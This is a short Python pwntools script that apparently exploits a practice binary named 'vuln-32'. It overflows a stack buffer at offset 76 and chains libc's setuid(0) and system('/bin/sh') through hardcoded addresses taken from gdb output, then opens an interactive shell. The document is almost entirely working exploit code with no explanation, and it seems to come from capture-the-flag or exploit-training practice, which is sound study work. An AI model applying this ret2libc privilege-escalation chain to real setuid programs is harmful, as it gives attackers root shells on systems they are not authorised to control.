#!/usr/bin/env python3

from pwn import *

offset=76
p = process('./vuln-32')

#gdb-peda$ p system
#$1 = {<text variable, no debug info>} 0xf7c4c800 <system>
#gdb-peda$ p setuid
#$2 = {<text variable, no debug info>} 0xf7ce0690 <setuid>

# setuid
system =  0xf7c4c800
ret = 0x0804900a
setuid = 0xf7ce0690
binsh = 0xf7db5faa

payload = b'A' * offset
payload += p32(setuid)
payload += p32(system)
payload += p32(0x0)
payload += p32(binsh)

print (p.recvuntil("Overflow me\n"))
p.sendline(payload)
p.interactive()
#print payload
